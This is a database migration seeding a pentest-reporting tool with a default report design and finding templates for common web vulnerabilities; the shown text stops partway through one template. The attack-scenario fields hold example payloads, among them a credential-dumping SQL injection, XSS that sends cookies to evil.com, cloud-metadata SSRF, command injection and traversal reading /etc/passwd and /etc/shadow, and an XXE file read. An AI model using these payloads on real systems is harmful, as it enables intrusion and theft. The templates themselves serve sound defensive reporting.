module.exports = {
  id: "004_reporter_seed",
  description: "Seed built-in default report design and finding templates for RedSecReporter.",
  up(db) {
    const now = Math.floor(Date.now() / 1000);

    // --- Helper to insert template fields ---
    function insertTemplateFields(templateId, fields) {
      for (const f of fields) {
        db.prepare(
          "INSERT OR IGNORE INTO reporter_template_fields (id, template_id, field_name, field_value, language) VALUES (?, ?, ?, ?, ?)"
        ).run(f.id, templateId, f.fieldName, f.fieldValue, f.language || "en");
      }
    }

    // --- Default Design ---
    const designId = "builtin-redsec-default";

    const findingFieldDefinitions = JSON.stringify([
      { name: "description", label: "Description", type: "markdown", required: true },
      { name: "attack_scenario", label: "Attack Scenario", type: "markdown" },
      { name: "impact", label: "Impact", type: "markdown", required: true },
      { name: "remediation", label: "Recommendation", type: "markdown", required: true },
      { name: "references", label: "References", type: "markdown" },
      { name: "affected_components", label: "Affected Components", type: "string" },
      { name: "retest_notes", label: "Re-test Notes", type: "markdown" },
    ]);

    const sectionDefinitions = JSON.stringify([
      { name: "executive_summary", label: "Executive Summary", type: "executive_summary" },
      { name: "scope", label: "Scope", type: "scope" },
      { name: "methodology", label: "Methodology", type: "methodology" },
      { name: "recommendations", label: "Recommendations", type: "recommendations" },
    ]);

    db.prepare(
      `INSERT OR IGNORE INTO reporter_designs
        (id, name, description, report_type, html_template, css_template, field_definitions, section_definitions, finding_field_definitions, finding_ordering_rule, finding_grouping_rule, is_builtin, sort_order, created_by, created_at, updated_at)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`
    ).run(
      designId,
      "RedSec Default",
      "Professional pentest report template with cover page, table of contents, executive summary, severity breakdown, detailed findings, and annexures. Based on the RedSec brand.",
      "external",
      "",  // empty means use the render service defaultHtmlTemplate()
      "",  // empty means use the render service defaultCssTemplate()
      "[]",
      sectionDefinitions,
      findingFieldDefinitions,
      "severity_desc",
      null,
      1,
      0,
      null,
      now,
      now
    );

    // --- Finding Templates ---
    const templates = [
      {
        id: "builtin-sqli",
        title: "SQL Injection",
        category: "Injection",
        severity: "critical",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        tags: ["owasp-a03", "injection", "database"],
        fields: [
          { id: "t-sqli-desc", fieldName: "description", fieldValue: "The application was found to be vulnerable to SQL Injection. User-supplied input is incorporated into SQL queries without proper sanitisation or parameterisation, allowing an attacker to manipulate the query logic and interact with the underlying database.\n\nBy injecting crafted SQL payloads via the affected parameter, it was possible to extract sensitive data from the database, including user credentials, application configuration, and potentially administrative functions." },
          { id: "t-sqli-attack", fieldName: "attack_scenario", fieldValue: "An attacker identifies a user-controllable input parameter that is incorporated into a database query. By submitting crafted SQL payloads (e.g., `' OR 1=1 --`, `UNION SELECT` statements), the attacker can:\n\n1. **Bypass authentication** mechanisms\n2. **Extract data** from any table in the database\n3. **Modify or delete** database records\n4. In some cases, **execute operating system commands** on the database server\n\nThe following payload was confirmed to work during testing:\n```\n' UNION SELECT username, password FROM users --\n```" },
          { id: "t-sqli-impact", fieldName: "impact", fieldValue: "Successful exploitation of SQL Injection can result in:\n\n- **Complete database compromise** — all stored data may be read, modified, or deleted\n- **Authentication bypass** — attacker can log in as any user including administrators\n- **Privilege escalation** — database administrator access may be obtained\n- **Data exfiltration** — sensitive information including credentials, personal data, and financial records can be extracted\n- **System compromise** — the underlying server may be compromised through database-specific features\n\nThis vulnerability has a **Critical** severity rating due to the potential for complete data breach and system compromise." },
          { id: "t-sqli-remediation", fieldName: "remediation", fieldValue: "To remediate SQL Injection vulnerabilities:\n\n1. **Use parameterised queries (prepared statements)** exclusively for all database interactions. Never concatenate user input into SQL strings.\n\n2. **Use an ORM** (Object-Relational Mapper) that handles query parameterisation automatically.\n\n3. **Apply input validation** — use allowlists for expected input patterns.\n\n4. **Apply the principle of least privilege** — database accounts used by the application should have minimal necessary permissions.\n\n5. **Deploy a Web Application Firewall (WAF)** as a temporary mitigation while fixes are applied.\n\n```python\n# Vulnerable\ncursor.execute(\"SELECT * FROM users WHERE id = \" + user_input)\n\n# Secure\ncursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_input,))\n```" },
          { id: "t-sqli-refs", fieldName: "references", fieldValue: "- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)\n- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)\n- [OWASP Testing Guide: SQL Injection](https://owasp.org/www-project-web-security-testing-guide/)\n- [PortSwigger: SQL Injection](https://portswigger.net/web-security/sql-injection)" },
        ],
      },
      {
        id: "builtin-xss-reflected",
        title: "Cross-Site Scripting (Reflected)",
        category: "Cross-Site Scripting",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
        tags: ["owasp-a03", "xss", "injection"],
        fields: [
          { id: "t-xssr-desc", fieldName: "description", fieldValue: "A Reflected Cross-Site Scripting (XSS) vulnerability was identified. The application reflects user-supplied input in the HTTP response without proper encoding or sanitisation.\n\nAn attacker can craft a malicious URL containing JavaScript payloads that execute in the context of a victim's browser when the link is visited." },
          { id: "t-xssr-attack", fieldName: "attack_scenario", fieldValue: "An attacker crafts a URL containing a malicious JavaScript payload within a reflected parameter:\n\n```\nhttps://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>\n```\n\nWhen a victim clicks the link, the script executes in their browser session, allowing the attacker to:\n\n1. **Steal session cookies** and hijack the user account\n2. **Perform actions** on behalf of the victim\n3. **Redirect** the victim to a phishing page\n4. **Keylog** form inputs including passwords\n5. **Spread** the attack via internal messaging" },
          { id: "t-xssr-impact", fieldName: "impact", fieldValue: "Successful exploitation enables:\n\n- **Session hijacking** — attacker gains full access to the victim's account\n- **Credential theft** — login forms can be intercepted\n- **Data exfiltration** — any data accessible to the victim can be sent to the attacker\n- **Malware delivery** — the browser can be redirected to exploit kits\n- **Lateral movement** — internal applications accessible to the victim can be attacked\n- **Phishing** — convincing fake login forms can be injected" },
          { id: "t-xssr-remediation", fieldName: "remediation", fieldValue: "To remediate Reflected XSS:\n\n1. **Context-aware output encoding** — encode all user-supplied data for the correct output context (HTML body, HTML attribute, JavaScript, CSS, URL).\n\n2. **Content Security Policy (CSP)** — deploy a strict CSP that prevents inline script execution.\n\n3. **Input validation** — validate and sanitise all user input on the server side using allowlists.\n\n4. **HTTP-only cookies** — mark session cookies as HttpOnly to prevent JavaScript access.\n\n5. **Use framework protections** — modern frameworks (React, Vue, Angular) automatically escape output by default." },
          { id: "t-xssr-refs", fieldName: "references", fieldValue: "- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)\n- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)\n- [PortSwigger: XSS](https://portswigger.net/web-security/cross-site-scripting)\n- [MDN: CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)" },
        ],
      },
      {
        id: "builtin-xss-stored",
        title: "Cross-Site Scripting (Stored)",
        category: "Cross-Site Scripting",
        severity: "critical",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L",
        tags: ["owasp-a03", "xss", "injection"],
        fields: [
          { id: "t-xsss-desc", fieldName: "description", fieldValue: "A Stored Cross-Site Scripting (XSS) vulnerability was identified. The application persists user-supplied input containing malicious JavaScript and renders it without proper encoding when other users view the stored content.\n\nUnlike reflected XSS, stored XSS does not require the victim to click a specially crafted link. The payload executes automatically for every user who views the affected content." },
          { id: "t-xsss-attack", fieldName: "attack_scenario", fieldValue: "An attacker submits a payload that is stored by the application (e.g., in a comment, profile field, or document title):\n\n```\n<img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">\n```\n\nWhen any other user views the page containing the stored payload, the JavaScript executes in their browser session automatically." },
          { id: "t-xsss-impact", fieldName: "impact", fieldValue: "Stored XSS is the most severe form of XSS because:\n\n- **All users are affected** — every user who views the compromised content is victimised\n- **No user interaction required** — the payload triggers on page load\n- **Persistent attack surface** — the payload remains active until removed from storage\n- **Worm potential** — self-replicating payloads can spread across the application\n- **Admin compromise** — administrative users viewing affected pages have their elevated sessions stolen" },
          { id: "t-xsss-remediation", fieldName: "remediation", fieldValue: "To remediate Stored XSS:\n\n1. **Encode output** — context-aware encoding for all stored content rendered in HTML.\n2. **Sanitise on input** — strip or neutralise dangerous HTML using a well-tested library.\n3. **Content Security Policy** — enforce a strict CSP preventing inline scripts.\n4. **HttpOnly cookies** — prevent JavaScript access to session tokens.\n5. **Input validation** — restrict stored content to expected formats." },
          { id: "t-xsss-refs", fieldName: "references", fieldValue: "- [OWASP Stored XSS](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)\n- [CWE-79](https://cwe.mitre.org/data/definitions/79.html)\n- [PortSwigger: Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)" },
        ],
      },
      {
        id: "builtin-csrf",
        title: "Cross-Site Request Forgery",
        category: "Broken Access Control",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
        tags: ["owasp-a01", "csrf"],
        fields: [
          { id: "t-csrf-desc", fieldName: "description", fieldValue: "The application is vulnerable to Cross-Site Request Forgery (CSRF). State-changing requests (such as password changes, email updates, fund transfers, or administrative actions) can be forged by an attacker.\n\nThe application does not implement anti-CSRF tokens or other protections to verify that requests originate from the legitimate application." },
          { id: "t-csrf-attack", fieldName: "attack_scenario", fieldValue: "An attacker creates a malicious page that automatically submits a forged request to the target application:\n\n```html\n<form action=\"https://example.com/account/change-email\" method=\"POST\">\n  <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n</form>\n<script>document.forms[0].submit();</script>\n```\n\nWhen a logged-in victim visits the attacker's page, the form is submitted using the victim's session cookie, changing their email address without their knowledge." },
          { id: "t-csrf-impact", fieldName: "impact", fieldValue: "CSRF allows an attacker to perform any action the victim is authorised to perform:\n\n- **Account takeover** — change email, password, or MFA settings\n- **Financial fraud** — initiate transactions or modify payment details\n- **Data manipulation** — modify or delete user data\n- **Privilege escalation** — change administrative settings if targeting an admin\n- **Social engineering** — actions performed appear to come from the victim" },
          { id: "t-csrf-remediation", fieldName: "remediation", fieldValue: "To remediate CSRF:\n\n1. **Implement anti-CSRF tokens** — include a unique, unpredictable token in every state-changing form and verify it server-side.\n2. **SameSite cookie attribute** — set session cookies to `SameSite=Strict` or `SameSite=Lax`.\n3. **Verify Origin/Referer headers** — reject requests with missing or mismatched headers.\n4. **Custom request headers** — require a custom header (e.g., `X-Requested-With`) for API requests.\n5. **Re-authentication** — require password confirmation for sensitive actions." },
          { id: "t-csrf-refs", fieldName: "references", fieldValue: "- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)\n- [CWE-352: CSRF](https://cwe.mitre.org/data/definitions/352.html)\n- [PortSwigger: CSRF](https://portswigger.net/web-security/csrf)" },
        ],
      },
      {
        id: "builtin-ssrf",
        title: "Server-Side Request Forgery",
        category: "Injection",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        tags: ["owasp-a10", "ssrf"],
        fields: [
          { id: "t-ssrf-desc", fieldName: "description", fieldValue: "The application is vulnerable to Server-Side Request Forgery (SSRF). A user-controllable input parameter allows the server to make requests to arbitrary URLs, including internal network resources that are not normally accessible from the outside.\n\nAn attacker can leverage this to enumerate internal services, access cloud metadata endpoints, and interact with backend systems." },
          { id: "t-ssrf-attack", fieldName: "attack_scenario", fieldValue: "The application accepts a URL parameter and makes a server-side HTTP request:\n\n```\nhttps://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\nThis allows the attacker to:\n1. Query cloud metadata to steal IAM credentials\n2. Scan internal ports and services\n3. Access internal APIs not exposed publicly\n4. Read local files via `file://` protocol\n5. Interact with cloud management interfaces" },
          { id: "t-ssrf-impact", fieldName: "impact", fieldValue: "Successful SSRF exploitation can lead to:\n\n- **Cloud credential theft** — AWS/Azure/GCP IAM roles can be assumed\n- **Internal network exposure** — services behind firewalls become accessible\n- **Data breach** — internal APIs may expose sensitive data without authentication\n- **Lateral movement** — pivot from the vulnerable server to internal systems\n- **Denial of service** — flood internal services with requests" },
          { id: "t-ssrf-remediation", fieldName: "remediation", fieldValue: "To remediate SSRF:\n\n1. **Allowlist approach** — only permit requests to pre-approved domains/IPs.\n2. **Block private ranges** — reject requests to 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16.\n3. **Block cloud metadata** — explicitly block 169.254.169.254.\n4. **Disable unused schemes** — block `file://`, `gopher://`, `dict://`.\n5. **Validate redirects** — re-check the redirect target against the allowlist.\n6. **Network segmentation** — restrict the application server's outbound network access." },
          { id: "t-ssrf-refs", fieldName: "references", fieldValue: "- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)\n- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)\n- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)" },
        ],
      },
      {
        id: "builtin-cmdi",
        title: "Operating System Command Injection",
        category: "Injection",
        severity: "critical",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        tags: ["owasp-a03", "injection", "rce"],
        fields: [
          { id: "t-cmdi-desc", fieldName: "description", fieldValue: "The application is vulnerable to OS Command Injection. User-supplied input is passed directly to operating system shell commands without proper sanitisation, allowing an attacker to execute arbitrary commands on the server.\n\nThis is one of the most critical vulnerabilities as it typically results in complete system compromise." },
          { id: "t-cmdi-attack", fieldName: "attack_scenario", fieldValue: "The application incorporates user input into a shell command:\n\n```\nhttps://example.com/ping?host=127.0.0.1;cat+/etc/passwd\n```\n\nAn attacker can inject command separators (`;`, `|`, `&&`, backticks, `$()`) to append additional commands:\n\n1. Read sensitive files (`/etc/passwd`, `/etc/shadow`)\n2. Execute reverse shells for persistent access\n3. Install backdoors and malware\n4. Pivot to other systems on the network" },
          { id: "t-cmdi-impact", fieldName: "impact", fieldValue: "Command injection results in:\n\n- **Complete server compromise** — full control over the operating system\n- **Data breach** — all data on the server can be read\n- **Persistence** — backdoors can be installed for ongoing access\n- **Lateral movement** — the server can be used to attack other internal systems\n- **Supply chain risk** — the compromised server can be used to attack users\n- **Denial of service** — the server can be shut down or wiped" },
          { id: "t-cmdi-remed", fieldName: "remediation", fieldValue: "To remediate Command Injection:\n\n1. **Avoid shell commands** — use language-native APIs instead of shell execution.\n2. **Parameterised execution** — if commands are necessary, use array-style parameter passing.\n3. **Input validation** — strict allowlist of permitted characters.\n4. **Sandboxing** — run commands in a restricted environment.\n\n```python\n# Vulnerable\nos.system(\"ping -c 1 \" + user_input)\n\n# Secure\nsubprocess.run([\"ping\", \"-c\", \"1\", user_input], shell=False)\n```" },
          { id: "t-cmdi-refs", fieldName: "references", fieldValue: "- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)\n- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)" },
        ],
      },
      {
        id: "builtin-path-traversal",
        title: "Path Traversal",
        category: "Broken Access Control",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        tags: ["owasp-a01", "lfi", "directory-traversal"],
        fields: [
          { id: "t-ptrav-desc", fieldName: "description", fieldValue: "The application is vulnerable to Path Traversal (also known as Directory Traversal). User-supplied input is used to construct file paths without proper validation, allowing an attacker to read arbitrary files on the server using sequences such as `../`.\n\nThis vulnerability can be exploited to access configuration files, source code, credentials, and other sensitive data outside the intended directory." },
          { id: "t-ptrav-attack", fieldName: "attack_scenario", fieldValue: "The application uses user input to read files:\n\n```\nhttps://example.com/download?file=../../../etc/passwd\nhttps://example.com/download?file=....//....//....//etc/shadow\n```\n\nAn attacker can:\n1. Read `/etc/passwd` to enumerate users\n2. Read application configuration for database credentials\n3. Read source code to identify additional vulnerabilities\n4. Access cloud provider credentials from instance metadata" },
          { id: "t-ptrav-impact", fieldName: "impact", fieldValue: "Path traversal can expose:\n\n- **System files** — `/etc/passwd`, `/etc/shadow`, SSH keys\n- **Application source code** — enables further vulnerability discovery\n- **Configuration files** — database credentials, API keys, secrets\n- **Environment variables** — cloud credentials, encryption keys\n- **Other users' data** — files belonging to other tenants in multi-tenant systems" },
          { id: "t-ptrav-remed", fieldName: "remediation", fieldValue: "To remediate Path Traversal:\n\n1. **Avoid passing user input to file operations** — use indirect references (IDs mapping to allowed files).\n2. **Canonicalise paths** — resolve the real path and verify it stays within the intended directory.\n3. **Allowlist** — only permit access to specifically named files.\n4. **Chroot/jail** — restrict file system access at the OS level.\n5. **URL-decode before validation** — prevent encoding bypass (`%2e%2e%2f`)." },
          { id: "t-ptrav-refs", fieldName: "references", fieldValue: "- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)\n- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)\n- [PortSwigger: Path Traversal](https://portswigger.net/web-security/file-path-traversal)" },
        ],
      },
      {
        id: "builtin-idor",
        title: "Insecure Direct Object Reference (IDOR)",
        category: "Broken Access Control",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        tags: ["owasp-a01", "idor", "access-control"],
        fields: [
          { id: "t-idor-desc", fieldName: "description", fieldValue: "The application is vulnerable to Insecure Direct Object Reference (IDOR). Access control checks are not properly enforced when accessing resources by their identifiers. An authenticated user can access or modify resources belonging to other users by simply changing the resource ID in the request.\n\nThis vulnerability indicates a failure to verify that the requesting user is authorised to access the specified resource." },
          { id: "t-idor-attack", fieldName: "attack_scenario", fieldValue: "The application uses predictable resource identifiers:\n\n```\nGET /api/users/1234/profile    (own profile)\nGET /api/users/1235/profile    (another user's profile — accessible!)\nGET /api/users/1/profile        (admin profile — accessible!)\n```\n\nAn attacker can:\n1. Enumerate user IDs to access all user profiles\n2. Modify other users' data by changing the ID in PUT/POST requests\n3. Access administrative functions by guessing admin resource IDs\n4. Download other users' files or documents" },
          { id: "t-idor-impact", fieldName: "impact", fieldValue: "IDOR can lead to:\n\n- **Unauthorised data access** — view other users' personal information, financial data\n- **Data modification** — change other users' settings, passwords, or content\n- **Privilege escalation** — access admin-only resources\n- **Mass data extraction** — enumerate and download all records\n- **Compliance violations** — unauthorised access to PII/PHI triggers breach notification requirements" },
          { id: "t-idor-remed", fieldName: "remediation", fieldValue: "To remediate IDOR:\n\n1. **Server-side authorisation** — verify ownership/access for every resource request.\n2. **Use indirect references** — map user-visible IDs to internal IDs via a session-bound lookup.\n3. **Deny by default** — require explicit access grants rather than relying on obscurity.\n4. **Centralise access checks** — use middleware or a service layer, not ad-hoc checks in each endpoint." },
          { id: "t-idor-refs", fieldName: "references", fieldValue: "- [OWASP IDOR](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)\n- [CWE-639: Bypass via ID](https://cwe.mitre.org/data/definitions/639.html)\n- [PortSwigger: IDOR](https://portswigger.net/web-security/access-control/idor)" },
        ],
      },
      {
        id: "builtin-broken-auth",
        title: "Broken Authentication",
        category: "Identification and Authentication",
        severity: "critical",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        tags: ["owasp-a07", "authentication"],
        fields: [
          { id: "t-ba-desc", fieldName: "description", fieldValue: "The application's authentication mechanism is fundamentally flawed. Identified weaknesses include insufficient brute-force protection, weak password policies, and/or session management vulnerabilities that allow authentication bypass.\n\nThese weaknesses can be combined to compromise user accounts at scale." },
          { id: "t-ba-attack", fieldName: "attack_scenario", fieldValue: "Multiple attack vectors are available:\n\n1. **Credential stuffing** — no rate limiting on login allows automated testing of leaked credentials\n2. **Brute force** — no account lockout enables systematic password guessing\n3. **Session fixation** — session tokens are not regenerated after login\n4. **Weak password reset** — predictable reset tokens allow account takeover\n5. **Default credentials** — administrative accounts use factory-default passwords" },
          { id: "t-ba-impact", fieldName: "impact", fieldValue: "Broken authentication enables:\n\n- **Mass account compromise** — automated tools can take over thousands of accounts\n- **Admin access** — weak credentials on admin accounts lead to full application control\n- **Data breach** — all user data becomes accessible\n- **Identity theft** — stolen accounts enable further attacks against users\n- **Regulatory penalties** — failure to protect authentication is a compliance violation" },
          { id: "t-ba-remed", fieldName: "remediation", fieldValue: "To remediate Broken Authentication:\n\n1. **Multi-factor authentication** — require MFA for all accounts.\n2. **Rate limiting** — implement progressive delays and lockouts on failed logins.\n3. **Strong password policy** — enforce minimum length, complexity, and check against breached passwords.\n4. **Secure session management** — regenerate session IDs on login, use secure cookie flags.\n5. **Account lockout** — temporarily lock accounts after repeated failures.\n6. **Credential monitoring** — check new passwords against known breach databases." },
          { id: "t-ba-refs", fieldName: "references", fieldValue: "- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)\n- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)\n- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)" },
        ],
      },
      {
        id: "builtin-sensitive-data",
        title: "Sensitive Data Exposure",
        category: "Cryptography",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        tags: ["owasp-a02", "crypto", "data-exposure"],
        fields: [
          { id: "t-sde-desc", fieldName: "description", fieldValue: "The application exposes sensitive data through insufficient protection mechanisms. This may include transmitting sensitive data in cleartext, storing passwords without proper hashing, using weak cryptographic algorithms, or exposing sensitive data in API responses and error messages.\n\nSensitive data such as credentials, personal information, financial data, or health records is not adequately protected at rest or in transit." },
          { id: "t-sde-attack", fieldName: "attack_scenario", fieldValue: "Sensitive data can be accessed through:\n\n1. **Network interception** — data transmitted over HTTP can be captured by network attackers\n2. **API response leakage** — sensitive fields are returned in API responses unnecessarily\n3. **Weak hashing** — passwords stored with MD5/SHA1 can be cracked\n4. **Error messages** — stack traces and SQL queries expose internal details\n5. **Source code exposure** — hardcoded secrets, API keys in client-side code" },
          { id: "t-sde-impact", fieldName: "impact", fieldValue: "Sensitive data exposure leads to:\n\n- **Credential compromise** — weak password storage enables offline cracking\n- **Privacy violations** — PII exposed to unauthorised parties\n- **Financial fraud** — payment card data or bank details leaked\n- **Regulatory non-compliance** — GDPR, HIPAA, PCI-DSS violations\n- **Reputation damage** — loss of customer trust" },
          { id: "t-sde-remed", fieldName: "remediation", fieldValue: "To remediate Sensitive Data Exposure:\n\n1. **Encrypt in transit** — enforce TLS 1.2+ for all connections, use HSTS.\n2. **Encrypt at rest** — encrypt databases, file storage, and backups.\n3. **Strong password hashing** — use bcrypt, scrypt, or Argon2id with appropriate work factors.\n4. **Minimal API responses** — only return fields the client needs.\n5. **Key management** — use a dedicated key management service, rotate keys regularly.\n6. **Data classification** — identify and label sensitive data, apply controls by classification level." },
          { id: "t-sde-refs", fieldName: "references", fieldValue: "- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)\n- [CWE-200: Information Exposure](https://cwe.mitre.org/data/definitions/200.html)\n- [CWE-312: Cleartext Storage](https://cwe.mitre.org/data/definitions/312.html)" },
        ],
      },
      {
        id: "builtin-misconfig",
        title: "Security Misconfiguration",
        category: "Configuration",
        severity: "medium",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        tags: ["owasp-a05", "configuration", "headers"],
        fields: [
          { id: "t-mc-desc", fieldName: "description", fieldValue: "The application has security misconfigurations that expose it to attack. This includes missing security headers, enabled debug modes, default credentials, unnecessary services running, verbose error messages, and incomplete hardening.\n\nSecurity misconfiguration is the most common vulnerability category, affecting nearly all applications to some degree." },
          { id: "t-mc-attack", fieldName: "attack_scenario", fieldValue: "Identified misconfigurations include:\n\n1. **Missing security headers** — no Content-Security-Policy, X-Frame-Options, X-Content-Type-Options\n2. **Verbose errors** — stack traces and database details in error responses\n3. **Default credentials** — admin interfaces accessible with factory defaults\n4. **Directory listing** — web server exposes file directory contents\n5. **Unnecessary HTTP methods** — PUT, DELETE, TRACE enabled\n6. **Outdated software** — server components running known-vulnerable versions" },
          { id: "t-mc-impact", fieldName: "impact", fieldValue: "Security misconfigurations can lead to:\n\n- **Information disclosure** — error messages reveal internal architecture\n- **Clickjacking** — missing X-Frame-Options allows UI redress attacks\n- **XSS amplification** — missing CSP makes XSS exploitation easier\n- **Unauthorised access** — default credentials provide entry points\n- **Service disruption** — debug modes can enable denial of service\n- **Compliance gaps** — missing headers fail security audits" },
          { id: "t-mc-remed", fieldName: "remediation", fieldValue: "To remediate Security Misconfiguration:\n\n1. **Hardening process** — establish a repeatable hardening process for all deployments.\n2. **Security headers** — deploy CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.\n3. **Disable debug mode** — ensure production environments never expose debug information.\n4. **Remove defaults** — change all default credentials and remove default content.\n5. **Automated scanning** — run configuration scanners in CI/CD pipelines.\n6. **Principle of least functionality** — disable all unnecessary features, services, and ports." },
          { id: "t-mc-refs", fieldName: "references", fieldValue: "- [OWASP Security Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/)\n- [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)\n- [Mozilla Observatory](https://observatory.mozilla.org/)" },
        ],
      },
      {
        id: "builtin-open-redirect",
        title: "Open Redirect",
        category: "Broken Access Control",
        severity: "medium",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        tags: ["owasp-a01", "redirect"],
        fields: [
          { id: "t-or-desc", fieldName: "description", fieldValue: "The application contains an Open Redirect vulnerability. A user-controllable parameter specifies the redirect destination without validation, allowing an attacker to redirect users to arbitrary external URLs.\n\nWhile not directly exploitable for data theft, open redirects are powerful tools in phishing campaigns and can be used to bypass URL-based security controls." },
          { id: "t-or-attack", fieldName: "attack_scenario", fieldValue: "The application uses a redirect parameter:\n\n```\nhttps://example.com/redirect?url=https://evil.com/phishing\nhttps://example.com/login?next=https://evil.com\n```\n\nAn attacker can:\n1. Create convincing phishing URLs that appear to originate from the trusted domain\n2. Bypass email security filters that allowlist the target domain\n3. Steal credentials through man-in-the-middle phishing pages\n4. Bypass SSRF allowlists that trust the target domain" },
          { id: "t-or-impact", fieldName: "impact", fieldValue: "Open redirect enables:\n\n- **Phishing attacks** — highly convincing phishing URLs using the trusted domain\n- **Credential theft** — victims enter passwords on attacker-controlled pages\n- **Bypass security controls** — URL allowlists that trust the target domain can be circumvented\n- **Reputation damage** — the domain may be flagged for phishing" },
          { id: "t-or-remed", fieldName: "remediation", fieldValue: "To remediate Open Redirect:\n\n1. **Whitelist approach** — only allow redirects to a predefined list of trusted URLs.\n2. **Relative paths only** — only allow relative URLs (`/dashboard`), not absolute.\n3. **Domain validation** — parse the URL and verify the hostname matches.\n4. **User confirmation** — show an interstitial page warning the user they are leaving the site." },
          { id: "t-or-refs", fieldName: "references", fieldValue: "- [CWE-601: Open Redirect](https://cwe.mitre.org/data/definitions/601.html)\n- [OWASP Unvalidated Redirects](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)" },
        ],
      },
      {
        id: "builtin-xxe",
        title: "XML External Entity Injection",
        category: "Injection",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L",
        tags: ["owasp-a05", "xxe", "xml"],
        fields: [
          { id: "t-xxe-desc", fieldName: "description", fieldValue: "The application is vulnerable to XML External Entity (XXE) Injection. The XML parser processes external entity references, allowing an attacker to read files on the server, perform Server-Side Request Forgery, or cause denial of service.\n\nThis occurs when the XML parser is configured to resolve external entities and does not restrict access to the local file system or network." },
          { id: "t-xxe-attack", fieldName: "attack_scenario", fieldValue: "An attacker submits an XML payload containing an external entity reference:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<user><name>&xxe;</name></user>\n```\n\nThe parser resolves the entity and includes the file contents in the response. Advanced attacks include:\n1. **SSRF via XXE** — `<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">`\n2. **Billion Laughs** — recursive entity expansion for denial of service\n3. **Parameter entities** — exfiltrate data via out-of-band channels" },
          { id: "t-xxe-impact", fieldName: "impact", fieldValue: "XXE can result in:\n\n- **Arbitrary file read** — access any file readable by the application process\n- **SSRF** — make requests to internal services and cloud metadata\n- **Denial of service** — resource exhaustion through entity expansion\n- **Data exfiltration** — steal configuration files, credentials, source code\n- **Network scanning** — enumerate internal services via response timing" },
          { id: "t-xxe-remed", fieldName: "remediation", fieldValue: "To remediate XXE:\n\n1. **Disable external entities** — configure the XML parser to disallow DTDs and external entities.\n2. **Disable DTDs entirely** — if DTDs are not needed, disable them.\n3. **Use JSON** — prefer JSON over XML where possible.\n4. **Input validation** — validate XML against a strict schema before parsing.\n\n```python\n# Python lxml - secure\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\n```" },
          { id: "t-xxe-refs", fieldName: "references", fieldValue: "- [OWASP XXE](https://owasp.org/www-community/attacks/XML_External_Entity_Processing)\n- [CWE-611: XXE](https://cwe.mitre.org/data/definitions/611.html)\n- [PortSwigger: XXE](https://portswigger.net/web-security/xxe)" },
        ],
      },
      {
        id: "builtin-weak-password",
        title: "Weak Password Policy",
        category: "Identification and Authentication",
        severity: "medium",
